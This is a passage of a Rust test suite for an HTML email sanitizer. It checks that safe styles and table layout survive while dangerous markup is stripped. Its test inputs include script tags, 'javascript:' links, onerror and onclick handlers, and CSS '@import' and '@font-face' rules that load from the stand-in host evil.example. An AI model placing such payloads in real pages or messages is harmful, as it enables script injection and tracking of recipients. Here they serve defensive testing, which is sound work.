        ] {
            assert!(safe.contains(kept), "{kept} missing from {safe}");
        }
        for dropped in ["tracker.example", "url(", "background-image", "position"] {
            assert!(!safe.contains(dropped), "{dropped} survived in {safe}");
        }
    }

    #[test]
    fn safe_stylesheet_and_media_rules_survive_scoped_to_the_letter() {
        let raw = concat!(
            "<style>",
            "body{margin:0;background-color:#fff}",
            ".card td{padding:12px;width:50%}",
            "@media screen and (max-width:600px){.card{width:100%}}",
            "@import url(https://evil.example/x.css);",
            "@font-face{font-family:x;src:url(https://evil.example/x.woff)}",
            "</style>",
            r#"<table class="card"><tr><td>left</td><td>right</td></tr></table>"#,
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let safe = out.as_sanitized_str();
        assert!(safe.contains("<style>"), "{safe}");
        assert!(
            safe.contains(".fm-message{margin:0;background-color:#fff;}"),
            "{safe}"
        );
        assert!(
            safe.contains(".fm-message .card td{padding:12px;width:50%;}"),
            "{safe}"
        );
        assert!(
            safe.contains("@media screen and (max-width:600px)"),
            "{safe}"
        );
        assert!(safe.contains(".fm-message .card{width:100%;}"), "{safe}");
        for dropped in ["@import", "@font-face", "evil.example", "url("] {
            assert!(!safe.contains(dropped), "{dropped} survived in {safe}");
        }
    }

    #[test]
    fn email_table_layout_attributes_survive_without_url_shaped_attributes() {
        let raw = concat!(
            r#"<table width="600" height="240" cellpadding="16" cellspacing="0" "#,
            r##"border="0" bgcolor="#ffffff" background="https://evil.example/bg.png">"##,
            r##"<tr valign="top" bgcolor="#f5f6f8"><td width="300" height="120" "##,
            r##"valign="middle" bgcolor="#eeeeee">cell</td></tr></table>"##,
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let safe = out.as_sanitized_str();
        for kept in [
            r#"width="600""#,
            r#"height="240""#,
            r#"cellpadding="16""#,
            r#"cellspacing="0""#,
            r#"border="0""#,
            r##"bgcolor="#ffffff""##,
            r#"valign="middle""#,
        ] {
            assert!(safe.contains(kept), "{kept} missing from {safe}");
        }
        assert!(!safe.contains("background="), "{safe}");
        assert!(!safe.contains("evil.example"), "{safe}");
    }

    /// T-120/T-144: retaining safe `style=` must not un-hide a newsletter preheader.
    /// The hidden span is omitted; the visible paragraphs stay; a script
    /// that sat next to the preheader is still stripped by the allow-list.
    #[test]
    fn hidden_preheader_does_not_become_visible_text() {
        let raw = concat!(
            "<p>Hello</p>",
            r#"<span style="font-size:0px;line-height:0px">PREHEADER_TOKEN</span>"#,
            "<script>evil()</script>",
            "<p>World</p>",
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(!s.contains("PREHEADER_TOKEN"), "{s}");
        assert!(!s.to_lowercase().contains("script"), "{s}");
        assert!(!s.contains("evil"), "{s}");
        assert!(s.contains("Hello"), "{s}");
        assert!(s.contains("World"), "{s}");
        assert!(
            s.contains("style=\"font-size:0px;line-height:0px;\""),
            "safe presentation CSS should survive after its hidden text was removed: {s}"
        );
    }

    #[test]
    fn oversized_input_refused_not_sanitized() {
        let big = "<p>".to_string() + &"a".repeat(64) + "</p>";
        let opts = SanitizeOptions {
            max_input_bytes: big.len() - 1,
            ..SanitizeOptions::default()
        };
        let (out, report) = sanitize(&html(&big), &opts);
        assert!(report.oversized_input);
        assert_eq!(out.as_sanitized_str(), "");
    }

    #[test]
    fn input_within_limit_is_sanitized_normally() {
        let ok = "<p>fits</p>".to_string();
        let opts = SanitizeOptions {
            max_input_bytes: ok.len(),
            ..SanitizeOptions::default()
        };
        let (out, report) = sanitize(&html(&ok), &opts);
        assert!(!report.oversized_input);
        assert!(out.as_sanitized_str().contains("fits"));
    }

    #[test]
    fn event_handler_class_guard_matches_any_on_prefixed_name() {
        for name in ["onclick", "onerror", "ONMOUSEOVER", "OnLoad", "onx", "on1"] {
            assert!(is_event_handler_attribute(name), "should match: {name}");
        }
        for name in ["title", "on", "o", "", "align", "data-on"] {
            assert!(
                !is_event_handler_attribute(name),
                "should not match: {name}"
            );
        }
    }

    #[test]
    fn event_handler_class_guard_survives_an_accidentally_permissive_allow_list() {
        // `build_sanitizer` (the function `sanitize()` actually calls) is
        // exercised here directly, with a deliberately widened
        // `tag_attributes` map that allows "onclick" and "ONMOUSEOVER" by
        // name on `div` — simulating a future edit accidentally adding an
        // event handler to the allow-list. If `is_event_handler_attribute`
        // (not the allow-list omission) is what's actually blocking these,
        // they must still be stripped.
        let mut permissive = tag_attributes();
        permissive.insert(
            "div",
            ["onclick", "onmouseover", "title"].into_iter().collect(),
        );
        let builder =
            build_sanitizer_with_tag_attributes(HashSet::new(), false, permissive, HashMap::new());
        let out = builder
            .clean(r#"<div onclick="evil()" ONMOUSEOVER="evil()" title="fine">x</div>"#)
            .to_string();
        let lower = out.to_lowercase();
        assert!(!lower.contains("onclick"), "onclick survived: {out}");
        assert!(
            !lower.contains("onmouseover"),
            "onmouseover survived: {out}"
        );
        assert!(
            lower.contains("title=\"fine\""),
            "unrelated attr lost: {out}"
        );
    }

    #[test]
    fn sanitized_html_debug_never_contains_body_or_attribute_content() {
        let body_canary = "SECRET-BODY-MARKER-D14";
        let attr_canary = "SECRET-ATTR-MARKER-D14";
        let raw = format!(r#"<p title="{attr_canary}">{body_canary}</p>"#);
        let (out, report) = sanitize(
            &html(&raw),
            &SanitizeOptions {
                allow_remote_images: true,
                ..SanitizeOptions::default()
            },
        );
        // Sanity: the canaries really did survive sanitizing (title/text
        // are allowed), otherwise this test would prove nothing.
        assert!(out.as_sanitized_str().contains(body_canary));
        assert!(out.as_sanitized_str().contains(attr_canary));

        let debugged = format!("{out:?}");
        assert!(
            !debugged.contains(body_canary),
            "Debug leaked body: {debugged}"
        );
        assert!(
            !debugged.contains(attr_canary),
            "Debug leaked attribute: {debugged}"
        );

        let report_debugged = format!("{report:?}");
        assert!(!report_debugged.contains(body_canary));
        assert!(!report_debugged.contains(attr_canary));
    }

    #[test]
    fn fuzz_random_bytes_never_panics() {
        let mut state: u64 = 0xD1B54A32D192ED03;
        let mut buf = String::with_capacity(8192);
        for _ in 0..8192 {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            // Keep it valid UTF-8: map into the ASCII range plus a few
            // "interesting" HTML-syntax bytes, since `UnsanitizedHtml`
            // always carries a `String`.
            let byte = (state & 0x7F) as u8;
            buf.push(byte as char);
        }
        for allow_remote_images in [true, false] {
            let opts = SanitizeOptions {
                allow_remote_images,
                ..SanitizeOptions::default()
            };
            let (out, report) = sanitize(&html(&buf), &opts);
            let _ = (out.as_sanitized_str(), report);
        }
    }

    #[test]
    fn structural_fuzz_mutated_html_never_panics() {
        let base = concat!(
            r#"<div title="x"><p>Hello <b>world</b></p>"#,
            r#"<script>evil()</script>"#,
            r#"<img src="https://example.com/a.gif" width="1" height="1" onerror="evil()">"#,
            r#"<img src="cid:part1@example.com">"#,
            r#"<a href="javascript:evil()">click</a>"#,
            r#"<style>@import url(x.css);</style>"#,
            "</div>",
        )
        .as_bytes();

        let mut state: u64 = 0x9E3779B97F4A7C15;
        let mut next_u64 = || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };

        for _ in 0..5_000 {
            let r = next_u64();
            let mut buf = base.to_vec();
            match r % 4 {
                0 => {
                    let cut = (r as usize) % (buf.len() + 1);
                    buf.truncate(cut);
                }
                1 => {
                    let i = (r as usize) % buf.len();
                    buf[i] ^= ((r >> 8) & 0xFF) as u8;
                }
                2 => {
                    let a = (r as usize) % buf.len();
                    let chunk_len = 1 + ((r >> 16) as usize) % 16;
                    let b = (a + chunk_len).min(buf.len());
                    buf.drain(a..b);
                }
                _ => {
                    let i = (r as usize) % (buf.len() + 1);
                    let garbage_len = 1 + ((r >> 16) as usize) % 16;
                    let garbage: Vec<u8> = (0..garbage_len)
                        .map(|k| ((r >> (k % 7 * 8)) & 0xFF) as u8)
                        .collect();
                    buf.splice(i..i, garbage);
                }
            }
            // `sanitize` takes `&str`; lossily repair any UTF-8 breakage
            // the byte-level mutation introduced, same as real-world mail
            // that lies about its charset would already have gone through
            // upstream decoding before reaching this crate.
            let s = String::from_utf8_lossy(&buf).into_owned();
            for allow_remote_images in [true, false] {
                let opts = SanitizeOptions {
                    allow_remote_images,
                    ..SanitizeOptions::default()
                };
                let (out, report) = sanitize(&html(&s), &opts);
                let _ = (out.as_sanitized_str(), report);
            }
        }
    }

    #[test]
    fn attributes_on_a_style_tag_do_not_bypass_the_css_allow_list() {
        for attr in [r#"id="s""#, r#"class="a""#, r#"title="t""#, r#"lang="en""#] {
            let raw = format!(
                concat!(
                    "<style {}>.fm-message{{position:fixed;top:0}}",
                    "p::before{{content:\"x\"}}",
                    "@import url(https://evil.example/x.css);",
                    "</style><p>real</p>"
                ),
                attr
            );
            let (out, _) = sanitize(&html(&raw), &SanitizeOptions::default());
            let s = out.as_sanitized_str();
            assert!(s.contains("real"), "{attr}: {s}");
            assert!(!s.contains("@import"), "{attr}: {s}");
            assert!(!s.contains("position:fixed"), "{attr}: {s}");
            assert!(!s.contains("evil.example"), "{attr}: {s}");
            assert!(!s.contains("content:"), "{attr}: {s}");
        }
    }

    #[test]
    fn a_style_tag_with_attributes_does_not_swallow_the_message_body() {
        let raw = r#"<style class="x">a{}<style>b{}</style><p>Important message text</p>"#;
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(s.contains("Important message text"), "{s}");
        assert_eq!(
            s.matches("<style").count(),
            s.matches("</style>").count(),
            "unbalanced style tags: {s}"
        );
    }

    #[test]
    fn a_child_combinator_in_a_style_block_survives_the_hidden_pass() {
        let raw = concat!(
            "<style>.a > .b{color:red}</style>",
            r#"<p class="a"><span class="b">hi</span></p>"#
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(s.contains(".fm-message .a > .b{color:red;}"), "{s}");
    }

    #[test]
    fn an_ampersand_in_a_style_block_is_not_escaped_into_the_stylesheet() {
        let raw = r#"<style>.a{font-family:"A&B"}</style><p>hi</p>"#;
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(!s.contains("A&amp;B"), "{s}");
        assert!(s.contains("\"A&B\""), "{s}");
    }

    #[test]
    fn a_media_query_survives_the_hidden_pass_scoped_to_the_letter() {
        // A single `>` anywhere inside an at-rule used to cost the sender
        // the whole block: the hidden pass escaped it and the CSS parser
        // then threw the rule away.
        let raw = concat!(
            "<style>@media screen{.a > td{color:red}}</style>",
            r#"<table><tr><td class="a">hi</td></tr></table>"#
        );
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(s.contains("@media screen"), "{s}");
        assert!(s.contains(".fm-message .a > td"), "{s}");
    }

    #[test]
    fn script_content_is_dropped_even_when_it_looks_like_markup() {
        // The raw-text states the hidden pass now sets must not turn a
        // script body into visible text: ammonia drops `<script>` with its
        // content (CLEAN_CONTENT_TAGS), and that has to keep holding for a
        // script whose body contains stray `<`.
        let raw = "<script>if (a<b) { document.write('<p>ghost</p>'); }</script><p>real</p>";
        let (out, _) = sanitize(&html(raw), &SanitizeOptions::default());
        let s = out.as_sanitized_str();
        assert!(s.contains("real"), "{s}");
        assert!(!s.contains("ghost"), "{s}");
        assert!(!s.contains("document.write"), "{s}");
        assert!(!s.contains("<script"), "{s}");
    }
}
